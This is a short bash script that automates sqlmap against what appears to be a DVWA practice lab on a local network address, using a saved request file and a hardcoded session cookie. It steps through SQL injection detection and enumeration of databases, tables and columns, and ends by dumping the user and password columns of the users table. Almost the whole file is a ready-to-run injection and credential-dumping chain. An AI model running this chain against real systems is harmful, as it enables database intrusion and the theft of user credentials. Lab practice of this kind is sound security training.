#!/bin/bash

TARGET_URL="http://192.168.0.103:8080/vulnerabilities/sqli/"
PHPSESSID="orlatscvk7pkupj0bqjhknvp41"
REQUEST_FILE="/home/gaoyin/Desktop/sqli_high.txt"

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

command -v sqlmap &> /dev/null || { echo -e "${RED}[-] sqlmap not found${NC}"; exit 1; }
[ -f "$REQUEST_FILE" ] || { echo -e "${RED}[-] File not found: $REQUEST_FILE${NC}"; exit 1; }

BASE_CMD="sqlmap -r \"$REQUEST_FILE\" --second-url=\"$TARGET_URL\" --batch"

echo -e "${GREEN}[*] Target: $TARGET_URL${NC}"
echo -e "${GREEN}[*] Request: $REQUEST_FILE${NC}\n"

echo -e "${GREEN}[1/5] Detecting${NC}"
eval $BASE_CMD

echo -e "${GREEN}[2/5] Databases${NC}"
eval "$BASE_CMD --dbs"

echo -e "${GREEN}[3/5] Tables${NC}"
eval "$BASE_CMD -D dvwa --tables"

echo -e "${GREEN}[4/5] Columns${NC}"
eval "$BASE_CMD -D dvwa -T users --columns"

echo -e "${GREEN}[5/5] Dumping data${NC}"
eval "$BASE_CMD -D dvwa -T users -C user,password --dump"

echo -e "${GREEN}[+] Done${NC}"
